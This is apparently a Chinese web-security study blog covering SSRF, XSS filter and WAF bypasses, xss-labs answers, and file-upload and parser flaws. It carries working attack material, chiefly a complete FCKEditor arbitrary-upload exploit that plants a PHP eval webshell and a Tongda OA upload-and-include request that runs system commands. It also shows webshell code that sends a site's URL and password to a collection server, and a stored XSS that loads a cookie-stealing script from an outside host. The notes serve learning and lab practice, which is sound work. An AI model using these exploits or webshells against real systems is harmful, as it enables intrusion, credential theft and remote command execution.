blog；使用了xml引擎对象的地方 如wordpress xmlrpc.php） 本地上传本地上传就是通过将自己本地的资源上传到服务器上 远程上传远程上传就是通过远程地址来上传文件，对方需要请求远程地址。 SSRF原理SSRF存在于远程上传或者远程加载的地方，服务器会对我们的远程地址进行请求，如果我们将该服务器的远程访问地址修改为127.0.0.1:端口，那么服务器就会对自己的端口进行探测。 各个协议调用探针12http,file,dict,ftp,gopher 等漏洞攻击：端口扫描，指纹识别，漏洞利用，内网探针等 1234http://192.168.64.144/phpmyadmin/file:///D:/www.txtdict://192.168.64.144:3306/infoftp://192.168.64.144:21 这里演示的是file协议，通过该协议可以读取本地文件内容 不同类型网站支持协议 SSRF漏洞代码测试12345678910111213141516171819202122232425262728&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;&lt;form action=&quot;&quot; method=&quot;POST&quot;&gt;请输入图片地址：&lt;input type=&#x27;text&#x27; name=&#x27;url&#x27;&gt;&lt;input type=&#x27;submit&#x27; value=&quot;提交&quot;&gt;&lt;/form&gt;&lt;?php/*$url=$_POST[&#x27;url&#x27;];$img =file_get_contents(&#x27;http://192.168.64.144:8080/?search==%00&#123;.exec|cmd.exe%20/c%20net%20user%20test1234%201234%20/add.&#125;&#x27;);echo $url;echo $img;//header(&quot;Content-Type: image/jpeg;text/html; charset=utf-8&quot;);//echo $img;//$file=fopen(&#x27;x.png&#x27;,&#x27;w+&#x27;);//fwrite($file,$img);//fclose($file);*/?&gt;&lt;?php$_POST[&#x27;url&#x27;];$ch = curl_init();curl_setopt($ch, CURLOPT_URL, $_POST[&#x27;url&#x27;]);curl_setopt($ch, CURLOPT_HEADER, false);curl_exec($ch);curl_close($ch);?&gt; 参考资料12https://pan.baidu.com/s/1bp96ECJhttps://www.t00ls.net/articles-41070.html","categories":[],"tags":[{"name":"Web","slug":"Web","permalink":"https://al0nez.github.io/tags/Web/"},{"name":"小迪学习笔记","slug":"小迪学习笔记","permalink":"https://al0nez.github.io/tags/%E5%B0%8F%E8%BF%AA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"CSRF","slug":"CSRF","permalink":"https://al0nez.github.io/tags/CSRF/"},{"name":"SSRF","slug":"SSRF","permalink":"https://al0nez.github.io/tags/SSRF/"}]},{"title":"28WEB漏洞-XSS跨站之WAF绕过及安全修复","slug":"28WEB漏洞-XSS跨站之WAF绕过及安全修复","date":"2021-09-21T02:34:32.000Z","updated":"2021-09-21T06:00:53.882Z","comments":true,"path":"2021/09/21/28WEB漏洞-XSS跨站之WAF绕过及安全修复/","link":"","permalink":"https://al0nez.github.io/2021/09/21/28WEB%E6%BC%8F%E6%B4%9E-XSS%E8%B7%A8%E7%AB%99%E4%B9%8BWAF%E7%BB%95%E8%BF%87%E5%8F%8A%E5%AE%89%E5%85%A8%E4%BF%AE%E5%A4%8D/","excerpt":"😆😆😆😆😆😆","text":"😆😆😆😆😆😆 常规 WAF 绕过思路 标签语法替换 1使用 a标签、img标签来替换script 特殊符号干扰 1#@!%&amp;/等等,特殊符号进行干扰 提交方式更改 1通过POST、GET方式进行绕过提交 垃圾数据溢出 1在&lt;script&gt;alert(1)asjkhdsajkhdjakh&lt;/script&gt;像这样就是垃圾数据 加密解密算法 1通过将XSS语句加密绕过 结合其他漏洞绕过 XSStrike工具XSStrike 主要特点 反射和 DOM XSS 扫描 多线程爬虫 Context分析 可配置的核心 检测和规避WAF 老旧的 JS 库扫描 智能 payload 生成器 手工制作的 HTML &amp; JavaScript解析器 强大的 fuzzing引擎 盲打 XSS 支持 高效的工作流 完整的 HTTP支持 Bruteforce payloads 支持 Payload 编码 参数12345678910111213141516171819202122-h, --help //显示帮助信息-u, --url //指定目标 URL--data //POST 方式提交内容-v, --verbose //详细输出-f, --file //加载自定义 paload 字典-t, --threads //定义线程数-l, --level //爬行深度-t, --encode //定义 payload 编码方式--json //将 POST 数据视为 JSON--path //测试 URL 路径组件--seeds //从文件中测试、抓取 URL--fuzzer //测试过滤器和 Web 应用程序防火墙。--update //更新--timeout //设置超时时间--params //指定参数--crawl //爬行--proxy //使用代理--blind //盲测试--skip //跳过确认提示--skip-dom //跳过 DOM 扫描--headers //提供 HTTP 标头-d, --delay //设置延迟 安全修复方案 开启 httponly,输入过滤，输出过滤等 PHP:http://www.zuimoge.com/212.html JAVA:https://www.cnblogs.com/baixiansheng/p/9001522.html 涉及资源： https://gitee.com/yhtmxl/imxss/ https://github.com/3xp10it/xwaf https://xssfuzzer.com/fuzzer.html https://github.com/s0md3v/XSStrike https://bbs.pediy.com/thread-250852.htm https://github.com/TheKingOfDuck/fuzzDicts","categories":[],"tags":[{"name":"Web","slug":"Web","permalink":"https://al0nez.github.io/tags/Web/"},{"name":"小迪学习笔记","slug":"小迪学习笔记","permalink":"https://al0nez.github.io/tags/%E5%B0%8F%E8%BF%AA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"XSS跨站","slug":"XSS跨站","permalink":"https://al0nez.github.io/tags/XSS%E8%B7%A8%E7%AB%99/"}]},{"title":"27WEB漏洞-XSS跨站之代码及httponly绕过","slug":"27WEB漏洞-XSS跨站之代码及httponly绕过","date":"2021-09-21T02:34:10.000Z","updated":"2021-09-21T06:00:59.165Z","comments":true,"path":"2021/09/21/27WEB漏洞-XSS跨站之代码及httponly绕过/","link":"","permalink":"https://al0nez.github.io/2021/09/21/27WEB%E6%BC%8F%E6%B4%9E-XSS%E8%B7%A8%E7%AB%99%E4%B9%8B%E4%BB%A3%E7%A0%81%E5%8F%8Ahttponly%E7%BB%95%E8%BF%87/","excerpt":"😆😆😆😆😆😆","text":"😆😆😆😆😆😆 HTTPOnly什么是HTTPOnly？如果您在cookie中设置了HttpOnly属性，那么通过js脚本将无法读取到cookie信息，这样能有效的防止XSS攻击(攻击手法)，具体一点的介绍请google进行搜索 开启HTTPOnly这里只介绍PHP如何开启。 PHP5.2以上版本已支持HttpOnly参数的设置，同样也支持全局的HttpOnly的设置，在php.ini中 1session.cookie_httponly = 设置其值为1或者TRUE，来开启全局的Cookie的HttpOnly属性，当然也支持在代码中来开启： 123&lt;?php ini_set(&quot;session.cookie_httponly&quot;, 1); // or session_set_cookie_params(0, NULL, NULL, NULL, TRUE); ?&gt; Cookie操作函数setcookie函数和setrawcookie函数也专门添加了第7个参数来做为HttpOnly的选项，开启方法为： 12setcookie(&quot;abc&quot;, &quot;test&quot;, NULL, NULL, NULL, NULL, TRUE); setrawcookie(&quot;abc&quot;, &quot;test&quot;, NULL, NULL, NULL, NULL, TRUE); 对于PHP5.1以前版本以及PHP4版本的话，则需要通过header函数来变通下了： 1&lt;?php header(&quot;Set-Cookie: hidden=value; httpOnly&quot;); ?&gt; 作用防止XSS读取cookie信息 演示将代码写入文件中 1ini_set(&quot;session.cookie_httponly&quot;, 1); 当我们是用XSS语句进行盗取Cookie时，这里直接将XSS代码写到代码中。 然后去查看XSS平台，可以看到Cookie没有被返回 绕过HttpOnly开启HttpOnly只会防止我们读取Cookie，而不会使我们XSS语句失效。如果对方开启了HttpOnly。除了可以通过获取Cookie来进行登录，还有一种方法就是通过账号和密码进行登录。 保存读取 如果对方在进行账号密码登录后，进行了浏览器保存。我们就可以利用XSS进行浏览器账号密码读取。 未保存读取 如果对方在进行账号密码登录后，没有进行浏览器保存。我们可以采用表单劫持的方式，将对方输入的账号密码，发送一份给我们。这个攻击有一个前提条件，登录页面必须要有XSS漏洞。 XSS-labs第一关1http://127.0.0.1/xss-labs/level1.php?name=&lt;script&gt;alert(/xss/)&lt;/script&gt; 第二关查看代码发现。 源码PHP htmlspecialchars() 函数 把预定义的字符 “&lt;” （小于）和 “&gt;” （大于）转换为 HTML 实体。 1echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#x27;&lt;center&gt; 显示结果将&lt;&gt;替换成了&amp;lt;， 1&lt;h2 align=&quot;center&quot;&gt;没有找到和&amp;lt;script&amp;gt;alet(1)&amp;lt;script&amp;gt;相关的结果.&lt;/h2&gt; 绕过 我们发现下面一个标签中还有一个我们写的js语句，我们可以在前面写上”&gt;闭合前面的，就可以执行XSS代码了。 1http://127.0.0.1/xss-labs/level2.php?keyword=&quot;&gt;&lt;script&gt;alert(/xss/)&lt;/script&gt; 第三关除了&lt;&gt;被过滤掉以后，”也被过滤掉了。我们在输入和第二关一样的代码时，双引号被代码实例化。 1&lt;input name=&quot;keyword&quot; value=&quot;&amp;quot;&gt;&lt;script&gt;alert(/xss/)&lt;/script&gt;&quot;&gt; 源码12echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&quot;&lt;center&gt;&lt;input name=keyword value=&#x27;&quot;.htmlspecialchars($str).&quot;&#x27;&gt; htmlspecialchars() 函数把预定义的字符转换为 HTML 实体。 预定义的字符是： &amp; （和号）成为 &amp; “ （双引号）成为 “ ‘ （单引号）成为 ‘ &lt; （小于）成为 &lt; &gt; （大于）成为 &gt; 知识HTML onclick 事件属性 当点击按钮时执行一段 JavaScript： 1&lt;button onclick=&quot;copyText()&quot;&gt;Copy Text&lt;/button&gt; 绕过12&#x27; onfocus=&#x27;javascript:alert(/xss/) #onfocus聚焦事件&#x27; onfocus=&#x27;alert(/xss/) 第四关和第3关一样 1&quot; onfocus=&quot;javascript:alert(/xss/) 第五关将on过滤了，过滤成o_n了 1&lt;input name=&quot;keyword&quot; value=&quot;&quot; o_nfocus=&quot;javascript:alert(/xss/)&quot;&gt; 绕过将XSS代码写成超链接形式 1&quot;&gt;&lt;a href=&quot;javascript:alert(/xss/)&quot;&gt;click me &lt;/a&gt; 第六关将href过滤了，可以通过大小写绕过 1&quot;&gt;&lt;a hREf=&quot;javascript:alert(/xss/)&quot;&gt;click me &lt;/a&gt; 第七关JavaScript的script替换为空了，所以我们双写绕过。 1&quot;&gt;&lt;scrscriptipt&gt;alert(/xss/)&lt;/scrscriptipt&gt; 第八关JavaScript的script过滤了，大小写没绕过，所以考虑编码绕过 1javas&amp;#99;ript:alert(/xss/) 第九关//注释掉后面的http://www.baidu.com绕过 1javas&amp;#99;ript:alert(/xss/)//http://www.baidu.com 第十关隐藏文本框，只有第三个有效 1http://127.0.0.1/xss-labs/level10.php?t_sort=&quot; type=&#x27;text&#x27; onfocus=&quot;alert(/xss/)&amp;submit=submit 第十一关知识 绕过抓包，将Referer值修改为payload便能通过这一关 1&quot; onfocus=&quot;alert(/xss/) 第十二关抓包，改一下UA值 1&quot; onfocus=&quot;alert(/xss/) 第十三关抓包修改cookie值 1&quot; onfocus=&quot;alert(/xss/) 第十四关好像没得环境，这关利用的是exif漏洞，看这个exif的文章吧。 https://blog.csdn.net/qq_32393893/article/details/104814749 第十五关XSS中有文件包含漏洞 1http://127.0.0.1/xss-labs/level15.php?src=&#x27;level1.php?name=&lt;a href=javascript:alert(1)&gt;aaa&lt;/a&gt;&#x27; 第十六关禁掉了空格，用回车代替%0d 1http://127.0.0.1/xss-labs/level16.php?keyword=&lt;img%0dsrc=123%0donerror=alert(1)&gt; 第十七关火狐和chrome很不一样。。。。chrome上可以 1http://127.0.0.1/xss-labs/level17.php?arg01=%20onmouseover&amp;arg02=javascript:alert(1) 第十八关一样？？？？ 1http://127.0.0.1/xss-labs/level18.php?arg01=%20onmouseover&amp;arg02=javascript:alert(1) 第十九关flash XSS chrome都把flash禁了，被淘汰了这flash，不做了不做了。(实际是因为懒) 第二十关一样懒","categories":[],"tags":[{"name":"Web","slug":"Web","permalink":"https://al0nez.github.io/tags/Web/"},{"name":"小迪学习笔记","slug":"小迪学习笔记","permalink":"https://al0nez.github.io/tags/%E5%B0%8F%E8%BF%AA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"XSS跨站","slug":"XSS跨站","permalink":"https://al0nez.github.io/tags/XSS%E8%B7%A8%E7%AB%99/"}]},{"title":"26WEB漏洞-XSS跨站之订单及Shell箱子反杀记","slug":"26WEB漏洞-XSS跨站之订单及Shell箱子反杀记","date":"2021-09-21T02:33:56.000Z","updated":"2021-09-21T06:01:05.567Z","comments":true,"path":"2021/09/21/26WEB漏洞-XSS跨站之订单及Shell箱子反杀记/","link":"","permalink":"https://al0nez.github.io/2021/09/21/26WEB%E6%BC%8F%E6%B4%9E-XSS%E8%B7%A8%E7%AB%99%E4%B9%8B%E8%AE%A2%E5%8D%95%E5%8F%8AShell%E7%AE%B1%E5%AD%90%E5%8F%8D%E6%9D%80%E8%AE%B0/","excerpt":"😆😆😆😆😆😆","text":"😆😆😆😆😆😆 Postman测试XSS返回的cookie是否正常，使用该工具 下载1https://www.postman.com/downloads/ 安装1https://blog.csdn.net/weixin_43184774/article/details/100578557 使用 WEB SHELL箱子当你入侵了别人的网站，写入大马或者其他木马，该木马会自动将网站地址和木马的登录密码发送到一个地方，这种就叫做WEB SHELL箱子。 代码这只是一种写法，还有很多种。将代码写到大马中，然后当大马被访问的时候。 12$url=$_SERVER[&#x27;HTTP_HOST&#x27;].$_SERVER[&#x27;PHP_SELF&#x27;];echo &quot;&lt;script src=&#x27;http://192.168.1.56/api.asp?url=$url&amp;pass=$password&#x27;&gt;&quot;; 复现 可以看到发送了一个请求。当你插入这个一句话木马在某个网页，它会发送这个网页的url以及一句话木马的密码到后门服务器 webshell箱子已经拿到了地址和密码，通过它就可以登录进去。 反杀当我们找到后门服务器的地址后，可以通过插入XSS语句来反杀后门 复现我们可以通过将密码修改为XSS代码，盗取cookie 1http://192.168.1.56/api.asp?url=www.baidu.con/1.php&amp;pass=&lt;script&gt;alert(1)&lt;/script&gt; 成功执行XSS代码 如果我们把这个xss代码改为获取cookie的代码，就可以把这个后台给拿下！后门作者以为你在第一层，其实你在第五层 1http://192.168.1.56/api.asp?url=www.huohu.con/1.php&amp;pass=&lt;sCRiPt sRC=//xsshs.cn/m6YT&gt;&lt;/sCrIpT&gt; 可以看到我们已经获取到cookie了。 1https://blog.csdn.net/xf555er/article/details/105151100 beef1https://smling.blog.csdn.net/article/details/106067842 XSS攻击位置 留言板 评论区 订单系统 反馈条件 ……. 如果网站是用session验证的，那么盗取cookie是登录不成功网站的。 获取session通过跨站脚本攻击让网站访问phpinfo页面，该页面有session的值。XSS平台有这方面的功能。这比较难。 涉及资源：1234http://xss.fbisb.com/ https://github.com/tennc/webshell https://www.postman.com/downloads/ https://pan.baidu.com/s/1lIUZvEVXs1du-Bmkt7-abA 提取码：xiaohttps://pan.baidu.com/s/13H4N1VTBVwd3t8YWpECBFw 提取码： xiao","categories":[],"tags":[{"name":"Web","slug":"Web","permalink":"https://al0nez.github.io/tags/Web/"},{"name":"小迪学习笔记","slug":"小迪学习笔记","permalink":"https://al0nez.github.io/tags/%E5%B0%8F%E8%BF%AA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"XSS跨站","slug":"XSS跨站","permalink":"https://al0nez.github.io/tags/XSS%E8%B7%A8%E7%AB%99/"}]},{"title":"25WEB漏洞-XSS跨站之原理分类及攻击手法","slug":"25WEB漏洞-XSS跨站之原理分类及攻击手法","date":"2021-09-21T02:33:35.000Z","updated":"2021-09-21T06:01:11.329Z","comments":true,"path":"2021/09/21/25WEB漏洞-XSS跨站之原理分类及攻击手法/","link":"","permalink":"https://al0nez.github.io/2021/09/21/25WEB%E6%BC%8F%E6%B4%9E-XSS%E8%B7%A8%E7%AB%99%E4%B9%8B%E5%8E%9F%E7%90%86%E5%88%86%E7%B1%BB%E5%8F%8A%E6%94%BB%E5%87%BB%E6%89%8B%E6%B3%95/","excerpt":"😆😆😆😆😆😆","text":"😆😆😆😆😆😆 XSS 跨站漏洞产生原理变量在接受数据的时候，数据可以写成javascript的形式，这个代码可以被浏览器识别，并且执行，从而造成了XSS漏洞。 危害 盗取各类用户帐号，如机器登录帐号、用户网银帐号、各类管理员帐号 控制企业数据，包括读取、篡改、添加、删除企业敏感数据的能力 盗窃企业重要的具有商业价值的资料 非法转账 强制发送电子邮件 网站挂马 控制受害者机器向其它网站发起攻击 特点XSS本质是前端漏洞，产生在前端。 XSS 跨站漏洞分类：反射反射性XSS是一次性的，不会讲XSS代码存储到数据库中，所以每次攻击都需要自己写。 例子 当我写入&lt;script&gt;alert(1)&lt;/script&gt;的时候 成功执行js代码，但是当我下一次输入其他的时候，不写入代码却没有弹窗，这就是反射型XSS。 存储存储型XSS是持久性跨站脚本，存储型会将代码保存到数据库中，每当有其他人点击的时候就会进行攻击。存储型XSS一般发生在留言板等地方。 例子 当我写入&lt;script&gt;alert(1)&lt;/script&gt;的时候，每次刷新页面，都会出现弹窗，此时代码已经被存储到数据库中了，这就是存储型XSS。 DOM dom树XSS执行会在前端代码中进行，不会到后端。 1发包 x=xiaodi =&gt; 本地浏览器静态前端代码 =x.php 例子 当我们输入1的时候此链接地址就拼接了我们的输入。 而且当我们继续点击的时候，代码并没有经过后端处理，而是由前端js代码进行处理，这就是dom型XSS的关键。 XSS 常规攻击手法平台，工具，结合其他等 攻击成功的条件：对方有漏洞，浏览器存有cookie，浏览器不进行拦截，不存在带代码过滤和httponly，对方要触发这个漏洞地址 cookie session用户凭据：通过凭据可以判断对方身份信息 cookie 存储本地 存活时间较长 小中型 session 会话 存储服务器 存活时间较短 大型 session会占用服务器的资源，但是比较安全。比如说javaweb中的session序列化和反序列化。 XSS平台使用创建 项目代码 使用 发现请求了这个地址。在平台上就有信息了 涉及资源：1234https://xss8.cc/xss.php?do=loginhttps://xsshs.cn/xss.php?do=loginhttps://github.com/do0dl3/xss-labshttp://down.chinaz.com/soft/37581.htm","categories":[],"tags":[{"name":"Web","slug":"Web","permalink":"https://al0nez.github.io/tags/Web/"},{"name":"小迪学习笔记","slug":"小迪学习笔记","permalink":"https://al0nez.github.io/tags/%E5%B0%8F%E8%BF%AA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"XSS跨站","slug":"XSS跨站","permalink":"https://al0nez.github.io/tags/XSS%E8%B7%A8%E7%AB%99/"}]},{"title":"24WEB漏洞-文件上传之WAF绕过及安全修复","slug":"24WEB漏洞-文件上传之WAF绕过及安全修复","date":"2021-09-21T02:33:04.000Z","updated":"2021-09-21T06:01:16.921Z","comments":true,"path":"2021/09/21/24WEB漏洞-文件上传之WAF绕过及安全修复/","link":"","permalink":"https://al0nez.github.io/2021/09/21/24WEB%E6%BC%8F%E6%B4%9E-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%B9%8BWAF%E7%BB%95%E8%BF%87%E5%8F%8A%E5%AE%89%E5%85%A8%E4%BF%AE%E5%A4%8D/","excerpt":"😆😆😆😆😆😆","text":"😆😆😆😆😆😆 基础知识上传参数名解析：明确哪些东西能修改？ Content-Disposition：一般可更改 name：表单参数值，不能更改 filename：文件名，可以更改 Content-Type：文件 MIME，视情况更改 常见绕过方法：数据溢出-防匹配(xxx…)通过输入大量的无效字符来进行数据溢出，防止匹配。 符号变异-防匹配（’ “ ;） 通过只用一个”进行包裹来绕过匹配。这里单引号也可以。经过测试发现安全狗这里应该是通过检测最后一个双引号或者单引号的位置，然后向前去匹配的。 数据截断-防匹配(%00 ; 换行) 第一种; 通过2.png;.php这样的方式可以进行绕过，但是前提是必须要单引号包裹才可以，;在代码中表示结束的意思，这样就可以绕过了。 第二种%00 这种方法POST提交需要进行手动编码，通过2.php%00.png形式绕过，%00要编码，原理还是进行截断 第三种 换行 这种方法同意需要单引号包裹才可以，将php进行换行，代码中就会形成p\\nh\\np的形式，从而绕过检测。 重复数据-防匹配(参数多次) 第一种 这种方法同意需要单引号包裹才可以，写成filename=&#39;1.png&#39;;filename=&#39;2.php&#39;;这样的形式可以绕过，原理是安全狗只会检测第一个遇到的filename的后缀。 第二种 / /也可以绕过 FUZZ字典手工测太慢了，使用工具来测试 需要有FUZZ字典，然后进行字典爆破。 12https://github.com/fuzzdb-project/fuzzdbhttps://github.com/TheKingOfDuck/fuzzDicts 文件上传安全修复方案 后端验证：采用服务端验证模式 后缀检测：基于黑名单，白名单过滤 MIME 检测：基于上传自带类型检测 内容检测：文件头，完整性检测 自带函数过滤：参考 uploadlabs 函数 自定义函数过滤：function check_file(){} WAF 防护产品：宝塔，云盾，安全公司产品等","categories":[],"tags":[{"name":"Web","slug":"Web","permalink":"https://al0nez.github.io/tags/Web/"},{"name":"小迪学习笔记","slug":"小迪学习笔记","permalink":"https://al0nez.github.io/tags/%E5%B0%8F%E8%BF%AA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"文件上传","slug":"文件上传","permalink":"https://al0nez.github.io/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"}]},{"title":"23WEB漏洞-文件上传之解析漏洞编辑器安全","slug":"23WEB漏洞-文件上传之解析漏洞编辑器安全","date":"2021-09-21T02:32:23.000Z","updated":"2021-09-21T06:01:22.522Z","comments":true,"path":"2021/09/21/23WEB漏洞-文件上传之解析漏洞编辑器安全/","link":"","permalink":"https://al0nez.github.io/2021/09/21/23WEB%E6%BC%8F%E6%B4%9E-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%B9%8B%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E7%BC%96%E8%BE%91%E5%99%A8%E5%AE%89%E5%85%A8/","excerpt":"😆😆😆😆😆😆","text":"😆😆😆😆😆😆 apache低版本解析漏洞原理Apache 解析文件的规则是从右到左开始判断解析,如果后缀名为不可识别文件解析,就再往左判断。比如 test.php.owf.rar “.owf”和”.rar” 这两种后缀是apache不可识别解析,apache就会把xxxx.php.owf.rar解析成php。 复现 Apache HTTPD 多后缀解析漏洞Apache HTTPD 支持一个文件拥有多个后缀，并为不同后缀执行不同的指令。比如，如下配置文件： 12AddType text/html .htmlAddLanguage zh-CN .cn 其给.html后缀增加了media-type，值为text/html；给.cn后缀增加了语言，值为zh-CN。此时，如果用户请求文件index.cn.html，他将返回一个中文的html页面。 以上就是Apache多后缀的特性。如果运维人员给.php后缀增加了处理器： 1AddHandler application/x-httpd-php .php 那么，在有多个后缀的情况下，只要一个文件含有.php后缀的文件即将被识别成PHP文件，没必要是最后一个后缀。利用这个特性，将会造成一个可以绕过上传白名单的解析漏洞。 漏洞复现 Apache HTTPD 换行解析漏洞（CVE-2017-15715）Apache HTTPD是一款HTTP服务器，它可以通过mod_php来运行PHP网页。其2.4.0~2.4.29版本中存在一个解析漏洞，在解析PHP时，1.php\\x0A将被按照PHP后缀进行解析，导致绕过一些服务器的安全策略。 漏洞复现 访问刚才上传的/1.php%0a，发现能够成功解析，但这个文件不是php后缀，说明目标存在解析漏洞： Nginx 文件名逻辑漏洞（CVE-2013-4547）影响版本：Nginx 0.8.41 ~ 1.4.3 / 1.5.0 ~ 1.5.7 漏洞原理1https://blog.werner.wiki/file-resolution-vulnerability-nginx/ 漏洞复现首先上传一个1.png的图片马，上传的时候要在1.png后面加上一个空格(windows则不需要)，之后正常上传。 之后访问这个图片，访问的时候要抓包，将后缀修改为http://your-ip:8080/uploadfiles/1.png[0x20][0x00].php，即可发现PHP已被解析。 首先先在png后面加...php 然后去hex中进行修改，将png前俩个点修改为20和00. 发送以后，我返回200，成功解析php代码。 WEB 编辑器网站后台中经常会有添加文字内容这类功能，而这一功能有时候会使用web编辑器来完成。WEB编辑器可以对文字、图片、音频等内容进行处理。而这些WEB编辑器存在一些安全问题，如果我们知道了该编辑器的名字和版本，就可以通过搜索得知他的具体漏洞情况。 一般通过扫描网站路径来获取编辑器信息。 编辑器漏洞手册1https://navisec.it/编辑器漏洞手册/ 编辑器 fckeditor263这里以fckeditor263为例进行演示 exp 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455&lt;?phperror_reporting(0);set_time_limit(0);ini_set(&quot;default_socket_timeout&quot;, 5);define(STDIN, fopen(&quot;php://stdin&quot;, &quot;r&quot;));$match = array();function http_send($host, $packet)&#123;$sock = fsockopen($host, 80);while (!$sock)&#123;print &quot;\\n[-] No response from &#123;$host&#125;:80 Trying again...&quot;;$sock = fsockopen($host, 80);&#125;fputs($sock, $packet);while (!feof($sock)) $resp .= fread($sock, 1024);fclose($sock);print $resp;return $resp;&#125;function connector_response($html)&#123;global $match;return (preg_match(&quot;/OnUploadCompleted\\((\\d),\\&quot;(.*)\\&quot;\\)/&quot;, $html, $match) &amp;&amp; in_array($match[1], array(0, 201)));&#125;print &quot;\\n+------------------------------------------------------------------+&quot;;print &quot;\\n| FCKEditor Servelet Arbitrary File Upload Exploit |&quot;;print &quot;\\n+------------------------------------------------------------------+\\n&quot;;if ($argc &lt; 3)&#123;print &quot;\\nUsage......: php $argv[0] host path\\n&quot;;print &quot;\\nExample....: php $argv[0] localhost /\\n&quot;;print &quot;\\nExample....: php $argv[0] localhost /FCKEditor/\\n&quot;;die();&#125;$host = $argv[1];$path = ereg_replace(&quot;(/)&#123;2,&#125;&quot;, &quot;/&quot;, $argv[2]);$filename = &quot;fvck.gif&quot;;$foldername = &quot;fuck.php%00.gif&quot;;$connector = &quot;editor/filemanager/connectors/php/connector.php&quot;;$payload = &quot;-----------------------------265001916915724\\r\\n&quot;;$payload .= &quot;Content-Disposition: form-data; name=\\&quot;NewFile\\&quot;; filename=\\&quot;&#123;$filename&#125;\\&quot;\\r\\n&quot;;$payload .= &quot;Content-Type: image/jpeg\\r\\n\\r\\n&quot;;$payload .= &#x27;GIF89a&#x27;.&quot;\\r\\n&quot;.&#x27;&lt;?php eval($_POST[cmd]) ?&gt;&#x27;.&quot;\\n&quot;;$payload .= &quot;-----------------------------265001916915724--\\r\\n&quot;;$packet = &quot;POST &#123;$path&#125;&#123;$connector&#125;?Command=FileUpload&amp;Type=Image&amp;CurrentFolder=&quot;.$foldername.&quot; HTTP/1.0\\r\\n&quot;;//print $packet;$packet .= &quot;Host: &#123;$host&#125;\\r\\n&quot;;$packet .= &quot;Content-Type: multipart/form-data; boundary=---------------------------265001916915724\\r\\n&quot;;$packet .= &quot;Content-Length: &quot;.strlen($payload).&quot;\\r\\n&quot;;$packet .= &quot;Connection: close\\r\\n\\r\\n&quot;;$packet .= $payload;print $packet;if (!connector_response(http_send($host, $packet))) die(&quot;\\n[-] Upload failed!\\n&quot;);else print &quot;\\n[-] Job done! try http://$&#123;host&#125;/$match[2] \\n&quot;;?&gt; 利用 通过执行脚本进行利用,利用需要知道WEB编辑器的路径 1php fck.php 127.0.0.1:8080 /fckeditor263/ CMS 文件上传识别网站CMS后该怎么办？以通达OA CMS为例 通达OA CMS(V11版本) 利用路径为：ispirit/im/upload.php 抓包构造POC： 12345678910111213141516171819202122232425262728293031POST /ispirit/im/upload.php HTTP/1.1Host: localhost:999Cache-Control: no-cacheUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36Content-Type: multipart/form-data; boundary=----WebKitFormBoundarypyfBh1YB4pV8McGBAccept: */*Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9,zh-HK;q=0.8,ja;q=0.7,en;q=0.6,zh-TW;q=0.5Cookie: PHPSESSID=123Connection: closeContent-Length: 660------WebKitFormBoundarypyfBh1YB4pV8McGBContent-Disposition: form-data; name=&quot;UPLOAD_MODE&quot;2------WebKitFormBoundarypyfBh1YB4pV8McGBContent-Disposition: form-data; name=&quot;P&quot;123------WebKitFormBoundarypyfBh1YB4pV8McGBContent-Disposition: form-data; name=&quot;DEST_UID&quot;1------WebKitFormBoundarypyfBh1YB4pV8McGBContent-Disposition: form-data; name=&quot;ATTACHMENT&quot;; filename=&quot;jpg&quot;Content-Type: image/jpeg&lt;?php$command=$_POST[&#x27;cmd&#x27;];$wsh = new COM(&#x27;WScript.shell&#x27;);$exec = $wsh-&gt;exec(&quot;cmd /c &quot;.$command);$stdout = $exec-&gt;StdOut();$stroutput = $stdout-&gt;ReadAll();echo $stroutput;?&gt; 上传成功；上传成功后访问文件包含路径/ispirit/interface/geteway.php burp抓包构造数据包： 12345678910POST /mac/gateway.php HTTP/1.1Host: 10.10.20.116:88（根据自己的IP而定）Connection: keep-aliveAccept-Encoding: gzip, deflateAccept: */*User-Agent: python-requests/2.21.0Content-Length: 69Content-Type: application/x-www-form-urlencodedjson=&#123;&quot;url&quot;:&quot;/general/../../attach/im/2003/941633647.jpg&quot;&#125;&amp;cmd=whoami 发送指令可发现命令执行成功： 参考链接1https://www.cnblogs.com/twlr/p/12989951.html#_label0_1 参考资料123https://navisec.it/编辑器漏洞手册/https://www.jb51.net/softs/75619.htmlhttps://pan.baidu.com/s/1eLjH_88fhXAw3ZwE7kVRbA 提取码：ywek","categories":[],"tags":[{"name":"Web","slug":"Web","permalink":"https://al0nez.github.io/tags/Web/"},{"name":"小迪学习笔记","slug":"小迪学习笔记","permalink":"https://al0nez.github.io/tags/%E5%B0%8F%E8%BF%AA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"文件上传","slug":"文件上传","permalink":"https://al0nez.github.io/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"}]},{"title":"22WEB漏洞-文件上传之内容逻辑数组绕过","slug":"22WEB漏洞-文件上传之内容逻辑数组绕过","date":"2021-09-21T02:31:27.000Z","updated":"2021-09-21T06:01:27.003Z","comments":true,"path":"2021/09/21/22WEB漏洞-文件上传之内容逻辑数组绕过/","link":"","permalink":"https://al0nez.github.io/2021/09/21/22WEB%E6%BC%8F%E6%B4%9E-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%B9%8B%E5%86%85%E5%AE%B9%E9%80%BB%